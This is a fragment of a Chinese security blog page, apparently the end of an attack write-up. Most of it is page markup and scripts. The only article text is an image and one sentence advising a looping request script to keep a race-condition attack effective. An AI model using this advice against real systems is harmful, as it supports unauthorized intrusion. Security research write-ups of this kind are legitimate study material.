+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LtHQsJ"><img src="https://s1.ax1x.com/2022/04/16/LtHQsJ.png" alt="LtHQsJ.png"></a></p>
+<p>要保持攻击的有效性，可以写个循环脚本去不间断循环请求；否则手动有时候会无法完美碰撞；当然如果手速可以大可不必写个脚本；</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="/2022/04/13/Spring-Cloud-Gateway-RCE/" style="float: left;">
+        ← Spring Cloud Gateway RCE
+    </a>
+    
+    
+    <a class="pull-right" href="/2022/04/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%AF%B9%E8%B1%A1%E5%AE%9E%E4%BE%8B%E5%8C%96%E7%9A%84%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/">
+        反序列化中对象实例化的原理探究 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
